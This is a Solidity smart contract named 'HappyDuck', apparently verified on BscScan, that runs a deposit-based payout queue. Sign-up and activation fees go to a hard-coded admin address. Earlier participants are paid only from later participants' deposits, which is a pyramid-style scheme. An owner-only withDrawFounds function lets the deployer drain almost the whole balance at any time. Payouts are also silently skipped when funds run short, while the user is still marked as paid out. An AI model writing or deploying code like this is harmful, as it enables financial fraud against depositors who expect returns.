/**
 *Submitted for verification at BscScan.com on 2021-08-29
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.7.4;

contract HappyDuck {
    using SafeMath for uint256;

    address payable private owner; // Who deploys
    address payable private admin; // Project manager

    uint256 private constant DIVIDER = 1000;

    uint256 private constant FEE = 0.021 ether; // 10$
    uint256 private constant SIGN_UP_AMOUNT = 0.11 ether; // 50$
    uint256 private constant ACTIVATE_AMOUNT = 0.21 ether; // 100$
    uint256 private constant PAYMENT = 0.39 ether; // 190$

    uint256 private constant ACTIVE_USERS = 2;

    address[] private ActivePool;
    address[] private HoldPool;
    
    uint256 private userCount = 0;
    uint256 private holdCount = 0;
        
    struct User {
        bool signedUp;
        bool active;
    }

    mapping(address => User) internal users;

    event SignUp(address indexed user, uint256 amount);
    event Active(address indexed user, uint256 amount);
    event Payment(address indexed user, uint256 amount);

    constructor() {
        owner = payable(msg.sender);
        admin = payable(0x7bCb6A969b713ea3bD7492b5a46797162e4E494d);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function isUserSignedUp(address user) internal view returns (bool) {
        return (users[user].signedUp == true);
    }

    function isUserActive(address user) internal view returns (bool) {
        return (users[user].active == true);
    }


    // Main functions
    function joinMe() external payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(!isUserSignedUp(msg.sender), "User is already registered");
        require(!isUserActive(msg.sender), "User is already active");
        require(msg.value >= SIGN_UP_AMOUNT.add(ACTIVATE_AMOUNT), "Deposit is below minimum amount");

        User storage user = users[msg.sender];

        if (user.signedUp == false && user.active == false) {
            admin.transfer(SIGN_UP_AMOUNT.add(FEE));

            user.signedUp = true;
            user.active = true;
            addUserPool(msg.sender);

            emit SignUp(msg.sender, SIGN_UP_AMOUNT);
            emit Active(msg.sender, ACTIVATE_AMOUNT);
        }
    }

    function signUp() external payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(!isUserSignedUp(msg.sender), "User is already registered");
        require(msg.value >= SIGN_UP_AMOUNT, "Deposit is below minimum amount");

        User storage user = users[msg.sender];

        if (user.signedUp == false) {
            admin.transfer(msg.value);

            user.signedUp = true;
            emit SignUp(msg.sender, msg.value);
        }
    }

    function activatePool() external payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(isUserSignedUp(msg.sender), "The user must be registered");
        require(!isUserActive(msg.sender), "User is already active");
        require(msg.value >= ACTIVATE_AMOUNT, "Deposit is below minimum amount");

        User storage user = users[msg.sender];

        if (user.active == false) {
            admin.transfer(FEE);

            uint256 amount = msg.value;
            amount = amount.sub(FEE);

            user.active = true;
            addUserPool(msg.sender);
            emit Active(msg.sender, amount);
        }
    }

    function userPayment(address user) internal {
        if (user != address(0)) {
            User storage userData = users[user];
            userData.active = false;

            if(address(this).balance > PAYMENT){
                // User payment
                payable(user).transfer(PAYMENT);
                emit Payment(user, PAYMENT);
            }
        }
    }

    function addUserPool(address user) internal {
        
        // Add user to pool
        if(ActivePool.length < ACTIVE_USERS){
            ActivePool.push(user);
        }
        else{
            HoldPool.push(user);
        }

        // Jump hold to active
        if (HoldPool.length > 4) {
            userCount++;

            if(userCount == 2){
                userCount = 0;

                userPayment(ActivePool[0]);
                for (uint256 i = 0; i < ActivePool.length - 1; i++) {
                    ActivePool[i] = ActivePool[i + 1];
                }
                ActivePool.pop();
        
                ActivePool.push(HoldPool[holdCount]);
                delete HoldPool[holdCount];
                holdCount++;
            }
        }
    }

    function withDrawFounds() public onlyOwner {
        uint256 amount = address(this).balance - 0.022 ether;
        payable(owner).transfer(amount);
    }

    function getActivePool() public view returns (address[] memory)
    {
        return ActivePool;
    }

    function getHoldPool() public view returns (address[] memory)
    {
        return HoldPool;
    }

    function getUserData(address _user) public view returns (bool signedUp, bool active)
    {
        User storage user = users[_user];
        return (user.signedUp, user.active);
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}